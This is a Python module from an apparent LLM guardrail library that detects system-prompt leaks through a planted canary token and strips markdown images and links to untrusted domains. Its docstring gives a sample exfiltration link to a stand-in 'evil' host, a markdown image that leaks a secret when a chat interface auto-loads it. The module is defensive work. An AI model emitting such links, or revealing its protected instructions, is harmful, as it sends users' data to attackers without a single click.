"""Output-side controls: canary tokens and exfiltration-link filtering.

Input detection will always miss something, so the response is inspected
before it reaches the user (defense in depth):

* A random **canary token** is planted in the system prompt. If it ever shows
  up in a response - verbatim, split up with separators, reversed, or base64
  encoded - the system prompt has leaked, and the response is redacted.
* **Markdown images/links** pointing at domains outside an allowlist are
  stripped. Chat UIs auto-fetch images, so ``![](https://evil/?q=<secret>)``
  exfiltrates data with zero user clicks.
"""

from __future__ import annotations

import base64
import re
import secrets
from dataclasses import dataclass, field
from urllib.parse import urlparse

CANARY_PREFIX = "CANARY"
_MD_LINK = re.compile(r"(!?)\[([^\]]*)\]\(\s*(https?://[^)\s]+)[^)]*\)")
_BARE_URL = re.compile(r"https?://[^\s)\"'>]+")


def make_canary() -> str:
    return f"{CANARY_PREFIX}-{secrets.token_hex(8)}"


def _squash(s: str) -> str:
    return re.sub(r"[^a-z0-9]", "", s.lower())


def canary_leaked(canary: str, text: str) -> bool:
    """True if ``canary`` appears in ``text`` in any common disguised form."""
    if not canary:
        return False
    if canary.lower() in text.lower():
        return True
    squashed_text = _squash(text)
    core = _squash(canary)
    if core in squashed_text or core[::-1] in squashed_text:
        return True
    # The secret part alone is enough to count as a leak.
    secret = _squash(canary.split("-", 1)[-1])
    if len(secret) >= 8 and secret in squashed_text:
        return True
    b64 = base64.b64encode(canary.encode()).decode().rstrip("=")
    return b64 in text


def _host_allowed(url: str, allowed_domains: set[str]) -> bool:
    host = (urlparse(url).hostname or "").lower()
    return any(host == d or host.endswith("." + d) for d in allowed_domains)


@dataclass
class OutputVerdict:
    text: str
    canary_leak: bool = False
    blocked_urls: list[str] = field(default_factory=list)

    @property
    def modified(self) -> bool:
        return self.canary_leak or bool(self.blocked_urls)


def inspect_response(
    response: str,
    canary: str | None = None,
    allowed_domains: set[str] | frozenset[str] = frozenset(),
) -> OutputVerdict:
    """Redact canary leaks and strip links to non-allowlisted domains."""
    allowed = {d.lower() for d in allowed_domains}

    if canary and canary_leaked(canary, response):
        return OutputVerdict(
            text="[response withheld: it disclosed protected system instructions]",
            canary_leak=True,
        )

    blocked: list[str] = []

    def _replace(m: re.Match) -> str:
        is_image, label, url = m.group(1), m.group(2), m.group(3)
        if _host_allowed(url, allowed):
            return m.group(0)
        blocked.append(url)
        # Images are dropped entirely; plain links keep their visible label.
        return "[image removed: untrusted domain]" if is_image else label

    text = _MD_LINK.sub(_replace, response)
    # Bare URLs with query strings to unknown hosts are also an exfil channel.
    for url in _BARE_URL.findall(text):
        if "?" in url and not _host_allowed(url, allowed):
            blocked.append(url)
            text = text.replace(url, "[url removed: untrusted domain]")
    return OutputVerdict(text=text, blocked_urls=blocked)
